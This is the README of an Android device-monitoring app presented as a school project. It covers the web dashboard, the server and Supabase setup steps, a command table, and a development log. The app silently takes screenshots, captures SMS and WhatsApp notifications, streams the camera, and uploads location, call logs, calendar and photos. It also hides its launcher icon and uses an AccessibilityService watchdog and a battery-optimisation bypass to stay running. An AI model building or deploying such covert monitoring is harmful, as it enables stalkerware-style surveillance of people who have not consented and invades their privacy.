# LokMe

Device Admin & Monitoring App — Android school project.

## Features

- **Device Admin** — Lock device remotely
- **Send Dialog** — Push messages to device screen
- **Location Tracking** — GPS coordinates via Supabase
- **Camera Capture** — Front/back camera photos
- **Call Log Reader** — Read and upload call history
- **Real-time WebSocket** — Instant command delivery
- **Admin Dashboard** — Web panel to manage devices
- **Screen Capture** — Silent screenshot via MediaProjection API
- **Notification Capture** — Capture SMS, WhatsApp, Telegram in real-time
- **Live Video Stream** — Real-time camera streaming to dashboard
- **Play Alarm** — Remote alarm ringtone at max volume
- **Vibrate Device** — Remote vibration control
- **Gallery** — Browse device photos & videos, download via Supabase
- **Calendar Reader** — Fetch last 7 days of calendar events
- **Battery Status** — Auto-sends every 10s via WebSocket
- **Battery Optimization Bypass** — Whitelist from doze mode
- **Keep-Alive Service** — AccessibilityService auto-restarts on kill
- **AccessibilityService** — Keeps CommandService alive

## Architecture

```
Android App (Kotlin) ←→ Node.js Server (Express + WS) ←→ Supabase (DB + Storage)
                                       ↓
                              Web Admin Dashboard
```

## Setup

### 1. Supabase
- Create project at [supabase.com](https://supabase.com)
- Go to SQL Editor → run `server/schema.sql`

### 2. Server (Render)
- Push this repo to GitHub
- On [render.com](https://render.com) → New Web Service
- Build: `npm install` | Start: `node index.js`
- Environment variables:
  - `SUPABASE_URL` = your project URL
  - `SUPABASE_KEY` = your service_role key

### 3. Android App
- Open `android/` in Android Studio
- Edit `LokMeApp.kt` → fill in Supabase URL, key, and server URL
- Build and install on device

### 4. Dashboard
- Open `https://your-server.onrender.com`

## Commands

| Command | Description |
|---------|-------------|
| `LOCK_DEVICE` | Lock screen immediately |
| `SHOW_DIALOG` | Display alert dialog |
| `GET_LOCATION` | Capture GPS coordinates |
| `GET_CALL_LOG` | Read last 50 calls |
| `CAPTURE_PHOTO` | Take photo (front/back) |
| `CAPTURE_SCREEN` | Silent screenshot |
| `START_VIDEO_STREAM` | Start live video stream |
| `STOP_VIDEO_STREAM` | Stop live video stream |
| `PLAY_ALARM` | Play alarm ringtone (configurable ms) |
| `VIBRATE_DEVICE` | Vibrate device (configurable ms) |
| `LIST_MEDIA` | Browse device photos & videos |
| `DOWNLOAD_FILE` / `DOWNLOAD_VIDEO` | Download file to Supabase Storage |
| `GET_CALENDAR` | Fetch last 7 days of calendar events |
| `HIDE_APP` / `SHOW_APP` | Hide/unhide app launcher icon |

## Tech Stack

- **Android:** Kotlin, CameraX, FusedLocation, Device Admin API, OkHttp WebSocket, MediaProjection, MediaStore
- **Server:** Node.js, Express, ws, Supabase JS
- **Dashboard:** HTML/CSS/JS, Chart.js, Leaflet.js maps
- **Database:** Supabase (PostgreSQL + Storage)

## Build Config

- AGP 8.9.1, Kotlin 2.3.21, compileSdk 36, targetSdk 34
- Gradle 8.12.1, Supabase BOM 3.6.0, CameraX 1.4.1

## Project Phases, Errors & Struggles

### Phase 1 — Foundation
- Set up Android project with Device Admin API, basic Supabase integration, CommandService lifecycle
- No major issues

### Phase 2 — Dashboard & Commands
- Built web dashboard with real-time updates via WebSocket
- Added location, camera, call log commands
- **Struggle:** Command execution timing — commands sent before WebSocket connected would never reach the device. Fixed by adding a pending command queue on the server.
- **Struggle:** Supabase PostgreSQL `created_at` default — column would be null on insert. Fixed by adding `DEFAULT timezone('utc'::text, now())` to schema.

### Phase 3 — Screen Capture (The Great Struggle)
- Silent screenshot using MediaProjection API
- **Error:** `MediaProjection` token expired after service restart — VirtualDisplay was null at capture time. Initially created VirtualDisplay once on startup, but it released on `onDestroy()`. **Fix:** recreating VirtualDisplay right before each capture + re-initializing from stored token if `mediaProjection` was null.
- **Error:** `QueryMiniThumbnail` method doesn't exist on `MediaStore.Images.Thumbnails` — caused build failure. Fixed by querying the thumbnails `ContentUri` directory using `IMAGE_ID` / `VIDEO_ID` columns instead.

### Phase 4 — Notification Capture & Deduplication
- Captured notifications (SMS, WhatsApp, Telegram) via NotificationListenerService
- **Error:** Double notifications — Android inserted to Supabase via REST, AND server inserted on WS receive. Fixed by removing server-side insert; dashboard deduplicates via `seenNotifIds` Set.
- **Error:** App names in dashboard were raw package names like `com.google.android.apps.messaging` instead of "SMS". Fixed by adding `getNotifBadgeClass()` + `getAppDisplay()` mapping.

### Phase 5 — File Browser → Gallery
- Initially built a file browser using `File.listFiles()`
- **Error:** On Android 11+, scoped storage prevents `listFiles()` from returning regular files — only directories appeared. Tried `MANAGE_EXTERNAL_STORAGE` permission but that requires user to grant it manually.
- **Struggle:** Replaced with `MediaStore` queries for images & videos, showing thumbnails from `MediaStore.Images.Thumbnails` / `MediaStore.Video.Thumbnails`.
- **Error:** The `filesPopup` HTML ID wasn't updated to match the JS — gallery button did nothing. Fixed by changing `id="filesPopup"` to `id="galleryPopup"`.

### Phase 6 — Live Video Stream
- Real-time camera streaming via binary WebSocket frames relayed to dashboard
- **Struggle:** High resolution caused lag. Fixed by reducing to 320×240 at JPEG quality 30 for faster frames.

### Phase 7 — Auto Battery Status
- Phone sends battery level every 30s (originally) via WS without manual command
- **Struggle:** Battery only updated when device selected — showed `--` on first open. Fixed by caching last value per device in `deviceBatteryCache` map, displayed instantly on `selectDevice()`.

### Phase 8 — Battery Interval Fix
- User wanted 10s instead of 30s
- Also wanted the dashboard label to match — changed "(auto 30s)" to "(auto 10s)"

### Phase 9 — Notification Colors & Labels
- WhatsApp → green, SMS (Google Messages) → blue, Snapchat → yellow, TikTok → red
- Custom display names instead of raw package names
- Added color badge CSS classes for each app

### Phase 10 — Keep-Alive & Persistence
- AccessibilityService auto-restarts CommandService when killed by system
- BootReceiver starts service on device boot
- App can hide its launcher icon

### Persistent Challenges

1. **Scoped Storage (Android 11+):** The `File` API is severely restricted. MediaStore queries work for media but not for arbitrary files. Full file system access requires `MANAGE_EXTERNAL_STORAGE` which needs manual user grant.
2. **MediaProjection Token Persistence:** The screen capture token from `createScreenCaptureIntent()` is valid only as long as the app process lives. After service restart, the token must be re-stored and recreated. Even then, Android may invalidate it at any time.
3. **Background Process Limits:** Android aggressively kills services on API 26+. Solved by foreground service + AccessibilityService watchdog.
4. **NotificationListenerService:** Only re-binds when user toggles the permission in settings. No programmatic re-binding possible.
5. **WebSocket Stability:** Phone's WS connection drops on network changes. Reconnect logic with exponential backoff was essential.
